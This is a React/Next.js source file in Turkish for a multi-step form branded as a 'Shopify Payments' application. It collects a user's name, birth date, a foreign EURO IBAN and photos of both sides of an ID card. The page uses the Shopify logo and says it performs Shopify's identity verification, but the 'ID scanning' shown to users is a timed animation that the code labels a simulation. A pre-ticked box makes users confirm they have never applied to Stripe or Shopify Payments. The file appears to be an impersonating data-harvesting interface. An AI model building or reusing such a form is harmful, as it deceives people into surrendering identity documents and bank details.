"use client"

import { useState } from "react"
import { AnimatePresence, motion } from "framer-motion"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Button } from "@/components/ui/button"
// import { Checkbox } from "@/components/ui/checkbox" // Verification: Checkbox doesn't exist, using native input instead.
import {
  User,
  Globe,
  Store,
  Palette,
  Target,
  Code,
  HelpCircle,
  Share2,
  Newspaper,
  Mic,
  BarChart3,
  Rocket,
  Zap,
  Repeat,
  CreditCard,
  Upload,
  Camera,
  FileText,
  CheckCircle2,
  ChevronDown,
  Info
} from "lucide-react"
import { AlertDialog } from "@/components/ui/alert-dialog"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { cn } from "@/lib/utils"
import { toast } from "sonner"

// Helper Card Component for selection steps
function SelectionCard({
  icon: Icon,
  label,
  selected,
  onClick
}: {
  icon: any,
  label: string,
  selected: boolean,
  onClick: () => void
}) {
  return (
    <button
      onClick={onClick}
      className={cn(
        "flex flex-col items-center justify-center p-6 rounded-2xl border-2 transition-all duration-300 gap-3 group",
        selected
          ? "border-[#95BF47] bg-[#95BF47]/5 shadow-[0_0_20px_rgba(149,191,71,0.1)]"
          : "border-gray-100 bg-white hover:border-gray-200 hover:shadow-lg"
      )}
    >
      <div className={cn(
        "w-12 h-12 rounded-xl flex items-center justify-center transition-colors",
        selected ? "bg-[#95BF47] text-white" : "bg-gray-50 text-gray-400 group-hover:bg-gray-100 group-hover:text-gray-600"
      )}>
        <Icon className="w-6 h-6" />
      </div>
      <span className={cn(
        "font-semibold text-xs transition-colors",
        selected ? "text-gray-900" : "text-gray-500 group-hover:text-gray-900"
      )}>
        {label}
      </span>
    </button>
  )
}

// STEP 1: Personal Info
export function StepPersonal({ data, updateData, onNext }: any) {
  return (
    <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-700">
      <div className="space-y-2 text-center">
        <h2 className="text-xl font-bold tracking-tight text-gray-900">Shopify Payments Başvuru</h2>
        <p className="text-xs text-gray-500">Hizmetinizi aktif edebilmemiz için lütfen bilgileri eksiksiz doldurun , aksi takdirde başvurunuz reddedilecektir.</p>
      </div>

      <div className="space-y-8 max-w-md mx-auto">
        <div className="space-y-2">
          <Label htmlFor="name" className="text-gray-700 font-semibold">Adınız Soyadınız nedir?</Label>
          <Input
            id="name"
            placeholder="Adınız Soyadınız"
            className="rounded-full border-gray-200 focus:border-[#95BF47] focus:ring-[#95BF47] h-12 bg-white"
            value={data.name || ""}
            onChange={(e) => updateData({ name: e.target.value })}
          />
        </div>

        <div className="space-y-4 pt-4">
          <div className="flex items-start gap-3">
            <input type="checkbox" className="mt-1 accent-[#95BF47] w-6 h-6" defaultChecked />
            <p className="text-xs text-gray-500 leading-snug">
              Girmiş olduğunuz bilgiler ile daha önce Stripe ve Shopify Payments'a başvuru yapmadığınızı onaylıyorsunuz.
            </p>
          </div>
        </div>

        <Button
          onClick={onNext}
          className="w-full h-12 rounded-full bg-black text-white hover:bg-gray-800 font-bold text-sm transition-all transform active:scale-[0.98]"
        >
          Devam Et
        </Button>
      </div>
    </div>
  )
}

// Custom Date Picker Component (Day, Month, Year)
function CustomDatePicker({ value, onChange }: { value: string, onChange: (val: string) => void }) {
  const months = ["Ocak", "Şubat", "Mart", "Nisan", "Mayıs", "Haziran", "Temmuz", "Ağustos", "Eylül", "Ekim", "Kasım", "Aralık"];
  const days = Array.from({ length: 31 }, (_, i) => (i + 1).toString());
  const years = Array.from({ length: 100 }, (_, i) => (2010 - i).toString());

  const date = value ? new Date(value) : null;
  const currentDay = date ? date.getDate().toString() : "";
  const currentMonth = date ? months[date.getMonth()] : "";
  const currentYear = date ? date.getFullYear().toString() : "";

  const [openPart, setOpenPart] = useState<string | null>(null);

  const handleSelect = (part: "d" | "m" | "y", val: string) => {
    let d = currentDay || "1";
    let m = currentMonth ? (months.indexOf(currentMonth)) : 0;
    let y = currentYear || new Date().getFullYear().toString();

    if (part === "d") d = val;
    if (part === "m") m = months.indexOf(val);
    if (part === "y") y = val;
    
    // Construct valid YYYY-MM-DD string
    const formattedDate = `${y}-${(m + 1).toString().padStart(2, "0")}-${d.padStart(2, "0")}`;
    onChange(formattedDate);
    setOpenPart(null);
  };

  return (
    <div className="grid grid-cols-3 gap-3">
      {[
        { label: "Gün", value: currentDay, options: days, part: "d" },
        { label: "Ay", value: currentMonth, options: months, part: "m" },
        { label: "Yıl", value: currentYear, options: years, part: "y" },
      ].map((item) => (
        <div key={item.part} className="relative">
          <button
            type="button"
            onClick={() => setOpenPart(openPart === item.part ? null : item.part)}
            className={cn(
              "w-full h-12 rounded-2xl border-2 bg-white flex items-center justify-between px-4 transition-all duration-300",
              openPart === item.part ? "border-[#95BF47] shadow-[0_0_15px_rgba(149,191,71,0.1)]" : "border-gray-100 hover:border-gray-200"
            )}
          >
            <div className="flex flex-col items-start translate-y-[1px]">
              <span className="text-[9px] uppercase font-bold text-gray-400 tracking-wider leading-none">{item.label}</span>
              <span className="text-sm font-semibold text-gray-900 leading-tight mt-0.5">{item.value || "—"}</span>
            </div>
            <ChevronDown className={cn("w-4 h-4 text-gray-400 transition-transform duration-300", openPart === item.part && "rotate-180")} />
          </button>

          <AnimatePresence>
            {openPart === item.part && (
              <motion.div
                initial={{ opacity: 0, y: 10, scale: 0.95 }}
                animate={{ opacity: 1, y: 0, scale: 1 }}
                exit={{ opacity: 0, y: 10, scale: 0.95 }}
                className="absolute top-full left-0 w-full mt-2 bg-white border border-gray-100 rounded-2xl shadow-2xl z-[100] max-h-48 overflow-y-auto custom-scrollbar"
              >
                {item.options.map((opt) => (
                  <button
                    key={opt}
                    onClick={() => handleSelect(item.part as any, opt)}
                    className={cn(
                      "w-full text-left px-4 py-2.5 text-sm transition-colors hover:bg-gray-50",
                      item.value === opt ? "text-[#95BF47] font-bold bg-[#95BF47]/5" : "text-gray-600"
                    )}
                  >
                    {opt}
                  </button>
                ))}
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      ))}
    </div>
  );
}

// STEP 2: Birth Date
export function StepBirthDate({ data, updateData, onNext, onBack }: any) {
  const age = data.birthDate ? calculateAge(data.birthDate) : 0;
  const isUnder18 = data.birthDate && age < 18;

  const handleNext = () => {
    if (isUnder18) {
      toast.error("Üzgünüz, 18 yaşından küçükler bu hizmetten yararlanamaz.")
      return;
    }
    onNext();
  }

  return (
    <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-700">
      <div className="space-y-2 text-center">
        <h2 className="text-xl font-bold tracking-tight text-gray-900">Doğum Tarihiniz</h2>
        <p className="text-xs text-gray-500">Yasal düzenlemeler gereği yaşınızı doğrulamamız gerekiyor.</p>
      </div>

      <div className="space-y-8 max-w-md mx-auto">
        <div className="space-y-3">
          <Label className="text-gray-700 font-semibold text-sm px-1">Seçim Yapın</Label>
          <CustomDatePicker 
            value={data.birthDate} 
            onChange={(val) => updateData({ birthDate: val })} 
          />
        </div>

        <div className="flex flex-col gap-4">
          <Button
            onClick={handleNext}
            disabled={!data.birthDate}
            className="w-full h-12 rounded-full bg-black text-white hover:bg-gray-800 font-bold text-sm transition-all transform active:scale-[0.98] disabled:opacity-50"
          >
            Devam Et
          </Button>
          <button onClick={onBack} className="text-sm font-medium text-gray-400 hover:text-gray-900 transition-colors">Geri git</button>
        </div>
      </div>
    </div>
  )
}

function calculateAge(birthDate: string): number {
  if (!birthDate) return 0;
  const birth = new Date(birthDate);
  const now = new Date();
  let age = now.getFullYear() - birth.getFullYear();
  const m = now.getMonth() - birth.getMonth();
  if (m < 0 || (m === 0 && now.getDate() < birth.getDate())) {
    age--;
  }
  return age;
}

// STEP 3: IBAN Information

export function StepIBAN({ data, updateData, onNext, onBack }: any) {
  const [isSkipDialogOpen, setIsSkipDialogOpen] = useState(false);

  return (
    <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-700">
      <div className="space-y-2 text-center">
        <h2 className="text-xl font-bold tracking-tight text-gray-900">Ödeme Bilgileri</h2>
        <p className="text-xs text-gray-500">Ödeme alabileceğiniz yurt dışı EURO IBAN adresinizi girin.</p>
      </div>

      <div className="space-y-8 max-w-md mx-auto">
        <div className="space-y-2">
          <div className="flex items-center gap-2 px-1">
            <Label htmlFor="iban" className="text-gray-700 font-semibold text-sm">EURO IBAN</Label>
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <button type="button" className="text-gray-400 hover:text-gray-600 transition-colors">
                    <Info className="w-4 h-4" />
                  </button>
                </TooltipTrigger>
                <TooltipContent className="bg-black text-white p-4 rounded-2xl max-w-xs shadow-2xl border border-white/10">
                  <p className="text-xs leading-relaxed font-medium">
                    Shopify Payments üzerinden elde ettiğiniz kazançların transfer edileceği, yurt dışı (AB/Avrupa) merkezli EURO hesabınıza ait IBAN bilgisidir.
                  </p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          </div>
          <div className="relative">
            <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
              <CreditCard className="w-5 h-5" />
            </div>
            <Input
              id="iban"
              placeholder="BE00 0000 0000 0000"
              className="rounded-full border-gray-200 focus:border-[#95BF47] focus:ring-[#95BF47] h-12 bg-white pl-12 uppercase"
              value={data.iban || ""}
              onChange={(e) => updateData({ iban: e.target.value.toUpperCase() })}
            />
          </div>
          <p className="text-[10px] text-gray-400 px-2 italic">Örnek: Payoneer veya Paysera EURO hesabınızdaki IBAN'ı kullanabilirsiniz.</p>
        </div>

        <div className="flex flex-col gap-4">
          <Button
            onClick={onNext}
            disabled={!data.iban || data.iban.length < 15}
            className="w-full h-12 rounded-full bg-black text-white hover:bg-gray-800 font-bold text-sm transition-all transform active:scale-[0.98] disabled:opacity-50"
          >
            Ekle
          </Button>
          
          <button 
            type="button"
            onClick={() => setIsSkipDialogOpen(true)}
            className="text-xs font-bold text-gray-400 hover:text-gray-900 transition-colors py-2"
          >
            Daha sonra ekleyeceğim
          </button>

          <button onClick={onBack} className="text-sm font-medium text-gray-400 hover:text-gray-900 transition-colors mt-2">Geri git</button>
        </div>
      </div>

      <AlertDialog
        isOpen={isSkipDialogOpen}
        onOpenChange={setIsSkipDialogOpen}
        title="IBAN Bilgisini Atlıyorsunuz"
        description="IBAN bilginizi girmediğiniz taktirde, başvurunuz onaylansa bile ödemeleriniz askıda bekleyecektir. Panel üzerinden dilediğiniz zaman ekleme yapabilirsiniz."
        cancelLabel="Vazgeç"
        actionLabel="Devam Et"
        onAction={onNext}
      />
    </div>
  )
}

// STEP 4: KYC Identity Verification
import Image from "next/image"

export function StepKYC({ data, updateData, onNext, onBack }: any) {
  const [kycStep, setKycStep] = useState(1); // 1: Front, 2: Back
  const [isScanning, setIsScanning] = useState(false);

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>, side: "idFront" | "idBack") => {
    const file = e.target.files?.[0];
    if (file) {
      setIsScanning(true);
      const reader = new FileReader();
      reader.onloadend = () => {
        updateData({ [side]: reader.result });
        // Simulation delay for "scanning" effect
        setTimeout(() => setIsScanning(false), 2000);
      };
      reader.readAsDataURL(file);
    }
  };

  return (
    <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-700">
      <div className="space-y-2 text-center px-4">
        <div className="w-12 h-12 bg-[#95BF47]/10 rounded-2xl flex items-center justify-center mx-auto mb-4">
          <CheckCircle2 className="w-6 h-6 text-[#95BF47]" />
        </div>
        <h2 className="text-xl font-bold tracking-tight text-gray-900">Kimlik Doğrulama</h2>
        <p className="text-xs text-gray-500">Shopify Payments'ın talep ettiği kimlik doğrulama işlemini tamamlayın.</p>
      </div>

      <div className="max-w-md mx-auto px-4">
        {/* Progress with Shopify Logo */}
        <div className="flex items-center justify-between mb-12 relative">
          <div className="absolute top-1/2 left-0 w-full h-0.5 bg-gray-100 -translate-y-1/2 -z-0" />
          
          <div className={cn(
            "relative z-10 w-10 h-10 rounded-full flex items-center justify-center text-xs font-bold transition-all duration-500 border-4",
            kycStep >= 1 ? "bg-[#95BF47] text-white border-white shadow-lg" : "bg-white border-gray-100 text-gray-400"
          )}>
            {data.idFront ? "✓" : "1"}
          </div>

          <motion.div 
            animate={{ opacity: [0.5, 1, 0.5] }}
            transition={{ duration: 2, repeat: Infinity }}
            className="relative z-10  px-4"
          >
            <Image src="/shopify.png" alt="Shopify" width={36} height={36}  />
          </motion.div>

          <div className={cn(
            "relative z-10 w-10 h-10 rounded-full flex items-center justify-center text-xs font-bold transition-all duration-500 border-4",
            kycStep >= 2 ? "bg-[#95BF47] text-white border-white shadow-lg" : "bg-white border-gray-100 text-gray-400"
          )}>
            {data.idBack ? "✓" : "2"}
          </div>
        </div>

        {/* 3D Flip Card Container */}
        <div className="[perspective:1000px] mb-8">
          <motion.div
            animate={{ rotateY: kycStep === 2 ? 180 : 0 }}
            transition={{ duration: 0.8, type: "spring", stiffness: 260, damping: 20 }}
            className="relative w-full aspect-[16/10] [transform-style:preserve-3d]"
          >
            {/* FRONT SIDE */}
            <div className="absolute inset-0 [backface-visibility:hidden]">
              <div className={cn(
                "w-full h-full rounded-[2rem] border-2 border-dashed transition-all duration-300 relative overflow-hidden bg-white",
                data.idFront ? "border-[#95BF47] shadow-2xl" : "border-gray-200"
              )}>
                {data.idFront ? (
                  <div className="relative w-full h-full group">
                    <input
                      type="file"
                      accept="image/*"
                      className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-20"
                      onChange={(e) => handleFileChange(e, "idFront")}
                    />
                    {/* eslint-disable-next-line @next/next/no-img-element */}
                    <img src={data.idFront} alt="Ön Yüz" className="w-full h-full object-cover" />
                    {isScanning && kycStep === 1 && <ScanningOverlay side="Ön Yüz" />}
                    <div className="absolute inset-0 bg-black/40 flex flex-col items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity z-10">
                      <Camera className="w-8 h-8 text-white mb-2" />
                      <span className="text-white text-[10px] font-bold uppercase tracking-widest">Ön Yüzü Değiştir</span>
                    </div>
                  </div>
                ) : (
                  <IDMockup side="Ön Yüz" onUpload={(e) => handleFileChange(e, "idFront")} />
                )}
              </div>
            </div>

            {/* BACK SIDE */}
            <motion.div 
              style={{ rotateY: 180 }}
              className="absolute inset-0 [backface-visibility:hidden]"
            >
              <div className={cn(
                "w-full h-full rounded-[2rem] border-2 border-dashed transition-all duration-300 relative overflow-hidden bg-white",
                data.idBack ? "border-[#95BF47] shadow-2xl" : "border-gray-200"
              )}>
                {data.idBack ? (
                  <div className="relative w-full h-full group">
                    <input
                      type="file"
                      accept="image/*"
                      className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-20"
                      onChange={(e) => handleFileChange(e, "idBack")}
                    />
                    {/* eslint-disable-next-line @next/next/no-img-element */}
                    <img src={data.idBack} alt="Arka Yüz" className="w-full h-full object-cover" />
                    {isScanning && kycStep === 2 && <ScanningOverlay side="Arka Yüz" />}
                    <div className="absolute inset-0 bg-black/40 flex flex-col items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity z-10">
                      <Camera className="w-8 h-8 text-white mb-2" />
                      <span className="text-white text-[10px] font-bold uppercase tracking-widest">Arka Yüzü Değiştir</span>
                    </div>
                  </div>
                ) : (
                  <IDMockup side="Arka Yüz" onUpload={(e) => handleFileChange(e, "idBack")} />
                )}
              </div>
            </motion.div>
          </motion.div>
        </div>

        {/* Controls */}
        <div className="flex flex-col gap-4">
          <AnimatePresence mode="wait">
            {isScanning ? (
              <motion.div
                key="scanning"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                className="w-full h-14 rounded-full bg-gray-900 text-white flex items-center justify-center gap-3 font-bold text-sm"
              >
                <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" />
                Kimliğiniz Taranıyor...
              </motion.div>
            ) : kycStep === 1 ? (
              <Button
                onClick={() => setKycStep(2)}
                disabled={!data.idFront}
                className="w-full h-14 rounded-full bg-black text-white hover:bg-gray-800 font-bold text-base transition-all transform active:scale-[0.98] disabled:opacity-50"
              >
                Arka Yüze Geç
              </Button>
            ) : (
              <div className="flex flex-col gap-3">
                <Button
                  onClick={onNext}
                  disabled={!data.idBack}
                  className="w-full h-14 rounded-full bg-black text-white hover:bg-gray-800 font-bold text-base transition-all transform active:scale-[0.98] disabled:opacity-50 shadow-[0_4px_20px_rgba(0,0,0,0.15)]"
                >
                  Onayla ve Bitir
                </Button>
                <button 
                  onClick={() => setKycStep(1)} 
                  className="text-xs font-bold text-gray-500 hover:text-gray-900 transition-colors py-2"
                >
                  Ön Yüzü Düzenle
                </button>
              </div>
            )}
          </AnimatePresence>
          
          <div className="flex justify-center gap-6">
            <button 
              onClick={kycStep === 1 ? onBack : () => setKycStep(1)} 
              className="text-sm font-medium text-gray-400 hover:text-gray-900 transition-colors"
            >
              Geri git
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}

function IDMockup({ side, onUpload }: { side: string, onUpload: (e: any) => void }) {
  return (
    <div className="w-full h-full flex flex-col items-center justify-center p-8 relative">
      <input type="file" accept="image/*" onChange={onUpload} className="absolute inset-0 opacity-0 cursor-pointer z-20" />
      
      {/* Mockup Lines */}
      <div className="absolute top-6 left-6 flex gap-2">
        <div className="w-12 h-12 bg-gray-50 rounded-xl" />
        <div className="space-y-2 py-1">
          <div className="w-20 h-2 bg-gray-50 rounded-full" />
          <div className="w-14 h-2 bg-gray-50 rounded-full op-60" />
        </div>
      </div>
      <div className="absolute bottom-6 right-6 space-y-2">
        <div className="w-24 h-2 bg-gray-50 rounded-full" />
        <div className="w-16 h-2 bg-gray-50 rounded-full opacity-60 ml-auto" />
      </div>

      <div className="w-16 h-16 rounded-3xl bg-gray-50 flex items-center justify-center group-hover:bg-[#95BF47]/10 transition-colors">
        <Upload className="w-8 h-8 text-gray-400" />
      </div>
      <div className="text-center mt-4">
        <p className="text-sm font-bold text-gray-900">{side}ü Yükle</p>
        <p className="text-[10px] text-gray-400 mt-1 px-10">Lütfen belgenin tam çerçeveye sığdığından emin olun</p>
      </div>
    </div>
  )
}

function ScanningOverlay({ side }: { side: string }) {
  return (
    <div className="absolute inset-0 bg-black/20 flex flex-col items-center justify-center gap-4">
      <motion.div 
        initial={{ top: "0%" }}
        animate={{ top: "100%" }}
        transition={{ duration: 1.5, repeat: Infinity, ease: "linear" }}
        className="absolute left-0 right-0 h-1 bg-gradient-to-r from-transparent via-[#95BF47] to-transparent shadow-[0_0_20px_#95BF47] z-10"
      />
      <div className="bg-white/90 backdrop-blur-md px-4 py-2 rounded-full shadow-2xl z-20">
        <p className="text-[10px] font-bold text-gray-900 uppercase tracking-widest">{side} Taranıyor...</p>
      </div>
    </div>
  )
}

// STEP 5: Success
export function StepSuccess({ onNext }: any) {
  const stages = [
    { id: 1, label: "Başvuru alındı", desc: "Başvurunuz sistemimize başarıyla ulaştı ve kayıt edildi.", active: true },
    { id: 2, label: "Başvuru işleme alındı", desc: "Uzman ekibimiz belgelerinizi ve bilgilerinizi inceliyor.", active: false },
    { id: 3, label: "Kurulum tamamlandı", desc: "Tüm entegrasyonlar tamamlandı ve mağazanız satışa hazır.", active: false },
  ];

  return (
    <div className="space-y-10 animate-in fade-in zoom-in duration-700 max-w-lg mx-auto pb-4">
      <div className="flex flex-col items-center justify-center text-center space-y-6 ">
        <motion.div 
          initial={{ scale: 0, rotate: -45 }}
          animate={{ scale: 1, rotate: 0 }}
          transition={{ type: "spring", damping: 12, stiffness: 200, delay: 0.2 }}
          className="w-24 h-24 bg-[#95BF47] rounded-full flex items-center justify-center shadow-[0_20px_40px_rgba(149,191,71,0.3)]"
        >
          <CheckCircle2 className="w-12 h-12 text-white" />
        </motion.div>
        
        <div className="space-y-3 px-4">
          <h2 className="text-4xl font-extrabold tracking-tight text-gray-900 italic">Başvurunuz alındı!</h2>
          <p className="text-gray-500 text-sm leading-relaxed max-w-md mx-auto">
            İşleme başlanıldı, süreci panel üzerinden takip edebilirsiniz. Size tüm aşamaları mail adresine ileteceğiz.
          </p>
        </div>
      </div>

      <div className="space-y-6 px-6">
        <h3 className="text-xs  text-gray-400 border-b border-gray-100/50 pb-2 text-center">Süreç Aşamaları</h3>
        
        <div className="space-y-10 relative max-w-sm mx-auto">
          <div className="absolute top-2 bottom-2 left-4 w-px bg-gray-200" />
          {stages.map((stage) => (
            <div key={stage.id} className="flex gap-8 relative z-10 items-start">
              <div className={cn(
                "w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold border-2 transition-all duration-500 shrink-0",
                stage.active ? "bg-[#95BF47] border-[#95BF47] text-white shadow-lg" : "bg-white border-gray-100 text-gray-400"
              )}>
                {stage.active ? "✓" : stage.id}
              </div>
              <div className="flex flex-col space-y-1">
                <span className={cn(
                  "text-lg font-bold transition-all duration-500",
                  stage.active ? "text-gray-900" : "text-gray-400"
                )}>{stage.label}</span>
                <p className={cn(
                  "text-xs leading-relaxed transition-all duration-500",
                  stage.active ? "text-gray-500" : "text-gray-300"
                )}>{stage.desc}</p>
                {stage.active && (
                  <motion.span 
                    initial={{ opacity: 0, x: -5 }}
                    animate={{ opacity: 1, x: 0 }}
                    className="text-[10px] text-[#95BF47] font-bold uppercase tracking-tighter"
                  >
                    • Şu anki aşama
                  </motion.span>
                )}
              </div>
            </div>
          ))}
        </div>
      </div>

      <div className="flex flex-col gap-4 px-8 pt-4">
        <Button
          onClick={onNext}
          className="w-full h-14 rounded-full bg-black text-white hover:bg-gray-800 font-bold text-base transition-all transform active:scale-[0.98] shadow-2xl"
        >
          Panele Git
        </Button>
      </div>
    </div>
  );
}


